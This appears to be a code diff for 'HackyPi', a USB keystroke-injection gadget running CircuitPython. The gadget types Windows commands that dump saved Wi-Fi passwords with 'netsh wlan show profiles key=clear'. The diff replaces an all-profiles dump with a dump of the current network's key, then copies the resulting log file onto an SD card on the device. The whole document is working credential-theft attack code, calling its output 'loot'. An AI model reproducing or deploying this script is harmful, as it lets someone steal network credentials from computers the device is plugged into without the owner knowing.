@@ -1,3 +1,4 @@
+import os
 import time
 import board
 import busio
@@ -9,6 +10,18 @@ from adafruit_display_text.label import Label
 from adafruit_hid.keyboard import Keyboard, Keycode
 from adafruit_st7789 import ST7789
 from keyboard_layout_win_uk import KeyboardLayout
+
+import storage
+import adafruit_sdcard
+
+SD_CS = board.GP17
+
+# Connect to the card and mount the filesystem.
+spi = busio.SPI(board.GP18, board.GP19, board.GP16)
+cs = digitalio.DigitalInOut(board.GP17)
+sdcard = adafruit_sdcard.SDCard(spi, cs)
+vfs = storage.VfsFat(sdcard)
+storage.mount(vfs, "/sd")
 
 # Constants for the display
 BORDER = 12
@@ -78,8 +91,8 @@ def save_file_in_current_directory(file_name, command, keyboard_layout):
 
 # Initial screen setup
 inner_rectangle()
-print_onTFT("HackyPi", 40, 40)
-print_onTFT("WIFI v1.0", 30, 80)
+print_onTFT("HackyPi", 50, 40)
+print_onTFT("WIFI v3.1", 30, 80)
 time.sleep(3)
 
 try:
@@ -99,81 +112,38 @@ try:
     # Delay before next command
     time.sleep(0.2)
     
-    # Get all SSID
-    keyboard_layout.write('cd %USERPROFILE% & netsh wlan show profiles | findstr "All" > a.txt')
+    # Get all SSID and change to HackyPi drive letter
+    keyboard_layout.write('FOR /F "tokens=* USEBACKQ" %F IN (`powershell -Command "(Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DriveType -eq 2}).DeviceID"`) DO (CD /D %F)')
     keyboard.send(Keycode.ENTER)
     time.sleep(0.5)
-    
-    # Create filter.bat to get all profile names
-    keyboard_layout.write('echo SETLOCAL EnableDelayedExpansion^')
-    keyboard.send(Keycode.ENTER)
-    time.sleep(0.1)
-    
-    # Additional Enters for script clarity
-    keyboard.send(Keycode.ENTER)
-    time.sleep(0.1)
-    
-    # Use for loop to process a.txt
-    keyboard_layout.write('for /f "tokens=5*" %%i in (a.txt) do (^')
-    keyboard.send(Keycode.ENTER)
-    time.sleep(0.1)
-    keyboard.send(Keycode.ENTER)
-    time.sleep(0.1)
-    
-    # Set variable and handle trailing spaces
-    keyboard_layout.write('set val=%%i %%j^')
-    keyboard.send(Keycode.ENTER)
-    time.sleep(0.1)
-    keyboard.send(Keycode.ENTER)
-    time.sleep(0.1)
-    
-    keyboard_layout.write('if "!val:~-1!" == " " set val=!val:~0,-1!^')
-    keyboard.send(Keycode.ENTER)
-    time.sleep(0.1)
-    keyboard.send(Keycode.ENTER)
-    time.sleep(0.1)
-    
-    # Output to filter.bat
-    keyboard_layout.write('echo !val!^>^>b.txt) > filter.bat')
-    keyboard.send(Keycode.ENTER)
-    time.sleep(0.1)
-    
-    # Run filter.bat and save all profile names in b.txt
-    keyboard_layout.write('filter.bat')
-    keyboard.send(Keycode.ENTER)
-    time.sleep(0.3)
-    keyboard.send(Keycode.ENTER)
-    time.sleep(0.3)
-    
-    # Save all the loot in Log.txt and delete other files
-    keyboard_layout.write('(for /f "tokens=*" %i in (b.txt) do @echo     SSID: %i & netsh wlan show profiles name="%i" key=clear | findstr /c:"Key Content" & echo.) > Log.txt')
-    keyboard.send(Keycode.ENTER)
-    time.sleep(1)
-    
-    #Delete unneeded files
-    keyboard_layout.write('del a.txt')
+
+    #Retrieve Wi-Fi details for current connection and save to file
+    keyboard_layout.write('for /f "tokens=2 delims=: " %i in (\'netsh wlan show interfaces ^| findstr /r "^....SSID" \') do @echo %i | netsh wlan show profiles %i key=clear >> log.txt')
     keyboard.send(Keycode.ENTER)
     time.sleep(0.5)
-    keyboard_layout.write('del b.txt')
-    keyboard.send(Keycode.ENTER)
-    time.sleep(0.5)
-    
+
     # Exit Command Prompt
     keyboard_layout.write('exit')
     keyboard.send(Keycode.ENTER)
     time.sleep(0.5)
         
     inner_rectangle()
-    print_onTFT("Files Created!!", 40, 80)
-    keyboard.release_all()
-
+    print_onTFT("Files", 70, 40)
+    print_onTFT("Created", 50, 80)
+    time.sleep(3)
+    
+    # Copy file to sd card
+    src = "log.txt"
+    dst = "/sd/log.txt"
+    with open(src, "rb") as src_file:
+        with open(dst, "wb") as dst_file:
+            dst_file.write(src_file.read())
+    
 except Exception as ex:
     keyboard.release_all()
     raise ex
 
 inner_rectangle()
-print_onTFT("Execution", 30, 40)
-print_onTFT("Complete", 40, 80)
+print_onTFT("Execution", 40, 40)
+print_onTFT("Complete", 50, 80)
 time.sleep(3)
-
-
